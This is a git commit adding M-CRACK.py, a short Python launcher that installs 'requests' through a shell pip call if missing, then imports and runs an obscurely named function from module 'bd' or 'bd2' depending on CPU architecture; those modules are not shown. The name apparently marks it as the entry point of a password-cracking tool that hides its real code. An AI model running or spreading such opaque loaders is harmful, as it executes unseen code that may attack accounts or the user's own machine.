de19714855fa9c9fea931291c6df8dfb082be528
Hasa N <112847065+KgHasan@users.noreply.github.com>
2022-09-24 16:28:28 +0600

    Add files via upload

---
+++ M-CRACK.py
@@ -0,0 +1,31 @@
+import os, platform
+ 
+try:
+ 
+        import requests
+ 
+except:
+ 
+        os.system('pip2 install requests')
+ 
+ 
+ 
+import requests
+ 
+bit = platform.architecture()[0]
+ 
+if bit == "64bit":
+ 
+        from bd import ____mahadi___
+ 
+        ____mahadi___()
+ 
+ 
+ 
+elif bit == "32bit":
+ 
+        from bd2 import ____mahadi___
+ 
+ 
+        ____mahadi___()
+ 
